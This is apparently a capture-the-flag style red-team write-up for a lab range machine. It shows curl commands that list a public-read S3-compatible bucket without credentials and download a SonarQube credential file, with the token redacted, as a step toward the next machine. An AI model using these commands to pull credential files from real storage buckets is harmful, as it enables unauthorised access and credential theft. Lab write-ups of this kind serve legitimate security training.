# solve_red.md — M3 · dev-artifacts
## Red Team Solution Writeup
**Range:** RNG-DEV-01 · VIKAS TANTRA
**Machine:** M3 — PUL Build Artifact Store
**Vulnerability:** Public-read ACL on the `pul-code-reports` bucket
**MITRE ATT&CK:** T1530

---

## Objective

Verify that `pul-code-reports` can be listed without credentials, then retrieve `sonarqube-access.env` to continue to M4.

## Environment

| Item | Value |
|---|---|
| Artifact store | `203.0.3.36:9000` |
| Bucket | `pul-code-reports` |
| Authentication | Not required for the exposed bucket reads |
| Credential object | `sonar-integration/sonarqube-access.env` |
| Next machine | M4 SonarQube portal, port `9200` |

## Step-by-Step Exploitation

### Step 1 — Confirm the public bucket response

```bash
curl --max-time 8 -fsS http://203.0.3.36:9000/pul-code-reports/ | sed 's/></>\n</g' | head -12
```
<img width="1385" height="282" alt="WindowsTerminal_NMd0i3Gj08" src="https://github.com/user-attachments/assets/f8230fa8-c9dc-4820-8ab9-364c7acb4dfe" />

The unauthenticated request returns an S3 bucket listing.

### Step 2 — List bucket objects

```bash
curl --max-time 8 -fsS "http://203.0.3.36:9000/pul-code-reports/?list-type=2" | grep -o '<Key>[^<]*</Key>'
```
<img width="1246" height="168" alt="WindowsTerminal_HYNKNo9pys" src="https://github.com/user-attachments/assets/8c21f26a-c424-4231-9fc9-caced70475b4" />

The listing includes `sonar-integration/sonarqube-access.env`.

### Step 3 — Retrieve the credential file

```bash
curl --max-time 8 -fsS "http://203.0.3.36:9000/pul-code-reports/sonar-integration/sonarqube-access.env" -o "$RANGE3_DIR/sonarqube-access.env"
sed -E 's/=.*/=<redacted>/' "$RANGE3_DIR/sonarqube-access.env"
```
<img width="1452" height="208" alt="WindowsTerminal_m2kUK7sGXx" src="https://github.com/user-attachments/assets/8f11589e-f402-4aeb-85d2-a305dea1e405" />

The file contains a SonarQube token for project `pul-firmware-ota`. The token value is redacted from this public writeup and remains in the private file for the next step. The file's `SONAR_HOST` is the placeholder `11.x.x.x`; use `203.0.3.36` for this deployed M4 service.

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Collection | Data from Cloud Storage Object | T1530 |

## Pivot

Use the `SONAR_TOKEN` saved in `$RANGE3_DIR/sonarqube-access.env` for M4. The exposed object is a lab credential; do not reuse it elsewhere.
